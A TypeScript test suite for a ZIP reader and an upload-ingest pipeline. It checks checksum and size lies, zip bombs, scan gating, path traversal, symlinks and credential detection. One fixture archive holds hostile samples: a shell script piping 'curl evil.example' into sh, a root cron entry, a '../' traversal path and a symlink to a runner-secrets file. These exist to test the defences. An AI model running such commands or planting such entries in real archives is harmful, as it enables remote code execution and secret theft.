// Reading a real ZIP, gating it on the malware scan, and extracting it — in that order.
//
// Every archive in this file is real bytes built by `fixtures/zip-writer.ts`, including the malformed ones. The
// reader's job is to be unsurprised by a hostile archive, which cannot be tested with a mock listing.
import { test } from "node:test";
import assert from "node:assert/strict";
import { existsSync, mkdtempSync, readFileSync, readdirSync, statSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { crc32, deflateRawSync } from "node:zlib";
import { ZIP_LIMITS, ZipArchive, ZipError } from "../src/frontend/zip.ts";
import { commonRoot, describeIngest, ingestArtifact } from "../src/frontend/ingest.ts";
import { dir, makeZip, symlink, viteProjectZip } from "./fixtures/zip-writer.ts";

const tmp = (): string => mkdtempSync(path.join(tmpdir(), "fe-ingest-"));
const codes = (r: { problems: { code: string }[] }) => r.problems.map((p) => p.code);

const CLEAN = { status: "clean" as const, engine: "ClamAV 1.3.1", scannedAt: "2026-11-05T00:00:00Z" };

test("[ZIP-001] a real archive is read from its central directory, with sizes, modes and types", () => {
  const z = ZipArchive.open(viteProjectZip());
  assert.equal(z.entries.length, 10);

  const pkg = z.find("summit-haul-frontend/package.json")!;
  assert.ok(pkg, "entries keep their raw paths");
  assert.equal(pkg.type, "file");
  assert.equal(pkg.method, 8, "deflated");
  assert.ok(pkg.size > pkg.compressedSize, `JSON compresses: ${pkg.size} → ${pkg.compressedSize}`);

  // The content round-trips, which means the local header offset, the data range and inflate all line up.
  const parsed = JSON.parse(z.read(pkg).toString("utf8"));
  assert.equal(parsed.name, "summit-haul");
  assert.equal(parsed.devDependencies.vite, "5.4.8");

  assert.equal(z.find("summit-haul-frontend/")!.type, "dir");
  assert.deepEqual(z.read(z.find("summit-haul-frontend/")!), Buffer.alloc(0), "a directory has no content to read");

  // The listing is what the verdict is reached from.
  const listing = z.listing();
  assert.equal(listing.length, z.entries.length);
  assert.ok(listing.every((e) => typeof e.size === "number" && e.path.length > 0));
});

test("[ZIP-002] a symlink is reported as one, with its target", () => {
  const z = ZipArchive.open(makeZip([
    { path: "index.html", body: "<h1>hi</h1>" },
    symlink("secrets", "/run/secrets/runner-token"),
  ]));

  const link = z.find("secrets")!;
  assert.equal(link.type, "symlink", "the Unix mode in the external attributes marks it");
  const listed = z.listing().find((e) => e.path === "secrets")!;
  assert.equal(listed.type, "symlink");
  assert.equal(listed.linkTarget, "/run/secrets/runner-token", "the target is read, so the verdict can say what it points at");
});

test("[ZIP-003] the reader does not trust the archive about anything", () => {
  // A local header claiming a different uncompressed size from the central directory. This is how a reader and a
  // scanner are made to disagree about an archive's contents.
  const liar = ZipArchive.open(makeZip([{ path: "a.txt", body: "hello", lieLocalSize: 99999 }]));
  assert.equal(liar.read(liar.find("a.txt")!).toString(), "hello", "the central directory is authoritative");

  // A wrong CRC: the bytes were altered after they were compressed.
  const bad = ZipArchive.open(makeZip([{ path: "a.txt", body: "hello", lieCrc: 0xdeadbeef }]));
  assert.throws(() => bad.read(bad.find("a.txt")!), /failed its checksum/);

  // An entry whose declared size does not match what it unpacks to.
  const short = ZipArchive.open(makeZip([{ path: "a.txt", body: "hello", lieSize: 4 }]));
  assert.throws(() => short.read(short.find("a.txt")!), /unpacked to 5 bytes but declares 4|expands beyond the size it declares/);

  // An unsupported compression method is refused, not guessed at.
  const exotic = ZipArchive.open(makeZip([{ path: "a.txt", body: "hello", rawMethod: 14 }]));
  assert.throws(() => exotic.read(exotic.find("a.txt")!), /compression method 14/);

  // Encryption: the archive cannot be checked, so it is not imported.
  const locked = ZipArchive.open(makeZip([{ path: "a.txt", body: "hello", encrypted: true }]));
  assert.equal(locked.find("a.txt")!.encrypted, true);
  assert.throws(() => locked.read(locked.find("a.txt")!), /is encrypted/);
});

test("[ZIP-004] a bomb is refused by the declared size, and by inflate's own output cap", () => {
  // 1. Declared up front: the central directory says the entries exceed the total limit.
  const many = Array.from({ length: 6 }, (_, i) => ({ path: `pad-${i}.bin`, body: "x", lieSize: 60 * 1024 * 1024 }));
  assert.throws(() => ZipArchive.open(makeZip(many)), /MB uncompressed/);

  // 2. Not declared: a small entry whose deflate stream really does expand enormously. The declared size is
  //    honest-looking, so only inflate's maxOutputLength catches it — which is why that cap is not optional.
  const huge = Buffer.alloc(4 * 1024 * 1024, 0x41);
  const z = ZipArchive.open(makeZip([{ path: "zip-bomb.css", body: huge, lieSize: 1024 }]));
  const e = z.find("zip-bomb.css")!;
  assert.equal(e.size, 1024, "it claims 1 KB");
  assert.throws(() => z.read(e), (err: Error) => {
    assert.ok(err instanceof ZipError, err.message);
    assert.match(err.message, /expands beyond the size it declares|unpacked to/);
    return true;
  });

  // A per-file ceiling as well, so one 200 MB file cannot be imported even in an otherwise small archive.
  const big = ZipArchive.open(makeZip([{ path: "video.bin", body: "x", lieSize: ZIP_LIMITS.maxFileBytes + 1 }]));
  assert.throws(() => big.read(big.find("video.bin")!), /per-file limit/);
});

test("[ZIP-005] a file that is not a ZIP, or is structurally broken, is refused clearly", () => {
  assert.throws(() => ZipArchive.open(Buffer.from("this is a PNG, actually")), /not a ZIP archive|too small/);
  assert.throws(() => ZipArchive.open(Buffer.alloc(0)), /too small/);

  // A valid archive whose central-directory offset has been corrupted to point outside the file.
  const good = viteProjectZip();
  const broken = Buffer.from(good);
  // The EOCD is the last 22 bytes; its central-directory offset is at +16.
  broken.writeUInt32LE(0x7fffffff, broken.length - 22 + 16);
  assert.throws(() => ZipArchive.open(broken), /central directory is outside the file/);

  // A truncated archive: the data is gone but the directory still describes it.
  const cut = Buffer.concat([good.subarray(0, 40), good.subarray(good.length - 22 - 500)]);
  assert.throws(() => ZipArchive.open(cut), /ZipError|signature|outside the file|central directory/);
});

test("[ING-001] a customer upload is not extracted without a clean scan", () => {
  const bytes = viteProjectZip();

  for (const status of ["pending", "failed", "quarantined", ""]) {
    const r = ingestArtifact({ bytes, destDir: path.join(tmp(), "site"), source: "customer-upload", scan: { status } });
    assert.equal(r.ok, false, `status "${status}" must not import`);
    assert.equal(r.extracted, null, "and nothing is written to disk");
    assert.equal(r.scanned, false);
    assert.ok(codes(r).some((c) => c === "scan-required" || c === "scan-failed"), codes(r).join(","));
  }

  // 'infected' is quarantined, not merely refused: the artifact is kept for a person to look at.
  const infected = ingestArtifact({ bytes, destDir: path.join(tmp(), "site"), source: "customer-upload", scan: { status: "infected", engine: "ClamAV" } });
  assert.equal(infected.ok, false);
  assert.equal(infected.quarantine, true);
  assert.match(infected.problems[0].detail, /flagged as infected by ClamAV/);
  assert.match(infected.problems[0].detail, /a person must replace it/);

  // The gate runs BEFORE the archive is even parsed, so a corrupt unscanned upload still reports the gate.
  const junk = ingestArtifact({ bytes: Buffer.from("not a zip"), destDir: path.join(tmp(), "s"), source: "customer-upload", scan: { status: "pending" } });
  assert.deepEqual(codes(junk), ["scan-required"], "the scan is the first question, not the last");
});

test("[ING-002] a clean upload imports, and the record never claims more than it checked", () => {
  const dest = path.join(tmp(), "site");
  const r = ingestArtifact({ bytes: viteProjectZip(), destDir: dest, source: "customer-upload", scan: CLEAN });

  assert.equal(r.ok, true, JSON.stringify(r.problems));
  assert.equal(r.scanned, true);
  assert.equal(r.framework, "vite");
  assert.equal(r.artifactSha.length, 64);
  assert.equal(r.archiveRoot, "summit-haul-frontend", "the single top-level folder is detected");
  assert.match(describeIngest(r), /imported as a vite project — scanned clean/);

  // The files landed at their logical paths, with the archive's own folder stripped.
  assert.ok(existsSync(path.join(dest, "package.json")), "package.json is at the root, not under summit-haul-frontend/");
  assert.ok(existsSync(path.join(dest, "src", "App.tsx")));
  assert.ok(existsSync(path.join(dest, "public", "logo.svg")));
  assert.equal(JSON.parse(readFileSync(path.join(dest, "package.json"), "utf8")).name, "summit-haul");
  assert.equal(r.extracted!.files, 9, "nine files; the directory entry is not a file");

  // An internal fixture skips the gate, and says so in those words rather than implying it was scanned.
  const fixture = ingestArtifact({ bytes: viteProjectZip(), destDir: path.join(tmp(), "f"), source: "internal-fixture" });
  assert.equal(fixture.ok, true);
  assert.equal(fixture.scanned, false, "a skipped gate is never recorded as a pass");
  assert.match(describeIngest(fixture), /internal fixture, not scanned \(no customer upload\)/);
});

test("[ING-003] nothing is written outside the destination, and no entry arrives executable", () => {
  const root = tmp();
  const dest = path.join(root, "site");
  const outside = path.join(root, "pwned.txt");

  // Traversal, an absolute path, and a symlink pointing at the runner's secrets — all in one archive.
  const hostile = makeZip([
    { path: "index.html", body: "<h1>Summit Haul</h1>" },
    { path: "styles.css", body: "body{margin:0}" },
    { path: "../pwned.txt", body: "owned" },
    { path: "/etc/cron.d/evil", body: "* * * * * root sh" },
    symlink("token", "/run/secrets/runner-token"),
    { path: "install.sh", body: "#!/bin/sh\ncurl evil.example | sh\n", mode: 0o100755 },
  ]);

  const r = ingestArtifact({ bytes: hostile, destDir: dest, source: "customer-upload", scan: CLEAN });
  assert.equal(r.ok, false);
  assert.equal(r.quarantine, true, "it is kept for inspection");
  assert.equal(r.extracted, null, "and not one byte was written");
  assert.ok(!existsSync(outside), "the traversal entry did not escape");
  assert.ok(!existsSync(dest) || readdirSync(dest).length === 0);

  const c = codes(r);
  assert.ok(c.includes("unsafe-path"), c.join(","));
  assert.ok(c.includes("symlink"));
  assert.ok(c.includes("executable-payload"), "the shell script is a payload, whatever its mode");

  // A clean archive's files arrive non-executable even when the archive asked for 0755.
  const ok = ingestArtifact({
    bytes: makeZip([dir("s"), { path: "s/index.html", body: "<h1>x</h1>", mode: 0o100755 }, { path: "s/app.css", body: "body{}" }]),
    destDir: path.join(root, "clean"), source: "internal-fixture",
  });
  assert.equal(ok.ok, true, JSON.stringify(ok.problems));
  const mode = statSync(path.join(root, "clean", "index.html")).mode & 0o777;
  assert.equal(mode & 0o111, 0, `nothing out of an archive is executable (mode ${mode.toString(8)})`);
});

test("[ING-004] the archive's own folder layout does not decide whether it imports", () => {
  // One top-level folder: stripped.
  assert.equal(commonRoot(["site/index.html", "site/css/a.css", "site/"]), "site");
  // Files at the top level: nothing to strip.
  assert.equal(commonRoot(["index.html", "css/a.css"]), "");
  // Two top-level folders: ambiguous, so nothing is stripped.
  assert.equal(commonRoot(["a/x.html", "b/y.html"]), "");
  // macOS noise does not defeat the detection, which is exactly how a Finder-made ZIP arrives.
  assert.equal(commonRoot(["__MACOSX/", "site/index.html", "site/app.css", ".DS_Store"]), "site");
  assert.equal(commonRoot(["only.html"]), "", "a single entry is not a root");

  // And a flat archive with no folder imports the same way.
  const flat = ingestArtifact({
    bytes: makeZip([{ path: "index.html", body: "<h1>hi</h1>" }, { path: "styles.css", body: "body{margin:0}" }, { path: "hero.png", body: Buffer.alloc(64) }]),
    destDir: path.join(tmp(), "flat"), source: "internal-fixture",
  });
  assert.equal(flat.ok, true, JSON.stringify(flat.problems));
  assert.equal(flat.framework, "static");
  assert.equal(flat.archiveRoot, "");

  // Finder noise is dropped rather than imported as part of the website.
  const noisy = ingestArtifact({
    bytes: makeZip([dir("s"), { path: "s/index.html", body: "<h1>x</h1>" }, { path: "__MACOSX/._index.html", body: "junk" }, { path: "s/.DS_Store", body: "junk" }]),
    destDir: path.join(tmp(), "noisy"), source: "internal-fixture",
  });
  assert.equal(noisy.ok, true, JSON.stringify(noisy.problems));
  assert.equal(noisy.extracted!.files, 1, "only index.html is the website");
});

test("[ING-005] a dry run reaches a verdict without touching the disk", () => {
  const dest = path.join(tmp(), "never-created");
  const r = ingestArtifact({ bytes: viteProjectZip(), destDir: dest, source: "customer-upload", scan: CLEAN, extract: false });
  assert.equal(r.ok, true);
  assert.equal(r.framework, "vite");
  assert.equal(r.extracted, null);
  assert.ok(!existsSync(dest), "a dry run creates nothing");
  assert.match(describeIngest(r), /verdict only, nothing written/);
});

test("[ING-006] a credential committed in the uploaded source stops the import", () => {
  const key = "AKIA" + "ABCDEFGHIJKLMNOP";
  const r = ingestArtifact({
    bytes: makeZip([
      dir("s"),
      { path: "s/index.html", body: "<h1>x</h1>" },
      { path: "s/styles.css", body: "body{}" },
      { path: "s/.env.production", body: `AWS_ACCESS_KEY_ID=${key}\n` },
    ]),
    destDir: path.join(tmp(), "creds"), source: "internal-fixture",
  });

  assert.equal(r.ok, false);
  assert.equal(r.quarantine, true);
  assert.ok(codes(r).includes("embedded-credential"));
  assert.ok(!describeIngest(r).includes(key), "the report names the credential type, never the value");
  assert.match(describeIngest(r), /aws-access-key/);
});

test("[ING-007] a deflate stream is read correctly at size, not just on toy input", () => {
  // 300 KB of realistic, compressible CSS through the real deflate/inflate path.
  const css = Array.from({ length: 4000 }, (_, i) => `.c-${i}{color:#1F3D2B;padding:${i % 32}px;margin:0 auto}`).join("\n");
  const z = ZipArchive.open(makeZip([
    dir("s"),
    { path: "s/index.html", body: "<h1>Summit Haul</h1>" },
    { path: "s/app.css", body: css },
  ]));
  const e = z.find("s/app.css")!;
  assert.ok(e.compressedSize < e.size / 4, `it really compressed: ${e.size} → ${e.compressedSize}`);
  assert.equal(z.read(e).toString("utf8"), css, "and inflates back byte for byte");
  assert.equal(crc32(Buffer.from(css)) >>> 0, e.crc >>> 0);
  assert.ok(deflateRawSync(Buffer.from(css)).length > 0);
});
